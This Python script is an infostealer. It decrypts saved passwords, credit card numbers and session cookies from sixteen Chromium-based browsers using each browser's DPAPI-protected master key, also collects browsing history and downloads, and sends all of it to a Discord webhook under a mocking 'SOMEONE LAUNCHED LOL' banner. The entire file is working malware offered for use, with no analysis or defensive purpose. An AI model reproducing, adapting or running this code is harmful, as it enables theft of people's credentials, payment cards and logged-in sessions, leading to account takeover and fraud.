import base64
import json
import os
import shutil
import requests
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

WEBHOOK_URL = 'WEBHOOK_URL'

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    local_state_path = os.path.join(path, "Local State")
    if 'os_crypt' not in open(local_state_path, 'r', encoding='utf-8').read():
        return

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv, payload = buff[3:15], buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
    return decrypted_pass

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def get_data(path: str, profile: str, key, data_type):
    db_file = os.path.join(path, f"{profile}{data_type['file']}")
    if not os.path.exists(db_file):
        return ""

    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(data_type['query'])

    for row in cursor.fetchall():
        row = list(row)
        if data_type['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if data_type['query'] == 'SELECT url, title, last_visit_time FROM urls': 
            row[2] = convert_chrome_time(row[2]) if row[2] != 0 else "0"

        result += "\n".join([f"{col}: {val}" for col, val in zip(data_type['columns'], row)]) + "\n\n"

    conn.close()
    os.remove('temp_db')
    return result

def save_results_to_discord(browser_name, data_by_type):
    if data_by_type:
        message = f'****SOMEONE LAUNCHED LOL**** | @everyone **{browser_name} DATA:\n\n**'
        files = {}
        for data_type, data_content in data_by_type.items():
            message += f'⇾ **{data_type}\n\n**'
            files[f'file_{data_type}'] = (f'{browser_name}_{data_type}.txt', data_content.encode('utf-8'))
            

        made_by_message = "[ ***Made By Exlerd*** ]\n✩──────────✩─────────✩"
        message += f'\n\n{made_by_message}'
        
        data = {
            'content': message,
            "username": "e x r d",
            "avatar_url": "https://i.pinimg.com/564x/3a/82/89/3a82895a4af0593f13adc0e5bd3175cb.jpg",
        }
        
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        if response.status_code == 200:
            print(f"\t [✅] Data sent to Discord for {browser_name}")
        else:
            print(f"\t [❌] Failed to send data to Discord for {browser_name}")

if __name__ == '__main__':
    browsers = {
        'AMIGO': os.path.join(os.getenv('LOCALAPPDATA'), 'Amigo', 'User Data'),
        'TORCH': os.path.join(os.getenv('LOCALAPPDATA'), 'Torch', 'User Data'),
        'KOMETA': os.path.join(os.getenv('LOCALAPPDATA'), 'Kometa', 'User Data'),
        'ORBITUM': os.path.join(os.getenv('LOCALAPPDATA'), 'Orbitum', 'User Data'),
        'CENT BROWSER': os.path.join(os.getenv('LOCALAPPDATA'), 'CentBrowser', 'User Data'),
        '7STAR': os.path.join(os.getenv('LOCALAPPDATA'), '7Star', '7Star', 'User Data'),
        'SPUTNIK': os.path.join(os.getenv('LOCALAPPDATA'), 'Sputnik', 'Sputnik', 'User Data'),
        'VIVALDI': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data'),
        'GOOGLE CHROME SXS': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data'),
        'GOOGLE CHROME': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
        'EPIC PRIVACY BROWSER': os.path.join(os.getenv('LOCALAPPDATA'), 'Epic Privacy Browser', 'User Data'),
        'MICROSOFT EDGE': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
        'URAN': os.path.join(os.getenv('LOCALAPPDATA'), 'uCozMedia', 'Uran', 'User Data'),
        'YANDEX': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data'),
        'BRAVE': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'IRIDIUM': os.path.join(os.getenv('LOCALAPPDATA'), 'Iridium', 'User Data'),
    }

    data_queries = {
        'Login Data': {
            'query': 'SELECT action_url, username_value, password_value FROM logins',
            'file': '\\Login Data',
            'columns': ['URL', 'Email', 'Password'],
            'decrypt': True
        },
        'Credit Cards': {
            'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
            'file': '\\Web Data',
            'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
            'decrypt': True
        },
        'Cookies': {
            'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
            'file': '\\Network\\Cookies',
            'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
            'decrypt': True
        },
        'History': {
            'query': 'SELECT url, title, last_visit_time FROM urls',
            'file': '\\History',
            'columns': ['URL', 'Title', 'Visited Time'],
            'decrypt': False
        },
        'Downloads': {
            'query': 'SELECT tab_url, target_path FROM downloads',
            'file': '\\History',
            'columns': ['Download URL', 'Local Path'],
            'decrypt': False
        }
    }

    for browser, browser_path in browsers.items():
        if os.path.exists(browser_path):
            master_key = get_master_key(browser_path)
            print(f"🔍 Getting Browser data from {browser}")

            browser_data_by_type = {}
            for data_type_name, data_type in data_queries.items():
                print(f"\t [🕵️‍♂️] Getting {data_type_name}")
                data = get_data(browser_path, "Default", master_key, data_type)
                if data:
                    browser_data_by_type[data_type_name] = data

            save_results_to_discord(browser, browser_data_by_type)
            print("\t------\n")
